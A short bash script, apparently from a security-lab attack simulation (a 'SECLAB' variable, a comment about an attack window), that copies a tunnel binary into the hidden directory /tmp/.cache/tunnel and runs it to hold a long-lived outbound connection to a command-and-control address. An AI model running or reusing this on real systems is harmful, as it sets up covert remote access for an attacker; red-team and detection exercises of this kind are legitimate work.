#!/usr/bin/env bash
# attack（窗口内）：部署隧道工具并保持出站长连接。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cp tunnel.elf /tmp/.cache/tunnel/tunnel.elf && chmod 0755 /tmp/.cache/tunnel/tunnel.elf
/tmp/.cache/tunnel/tunnel.elf "$C2_IP" 8443 3000
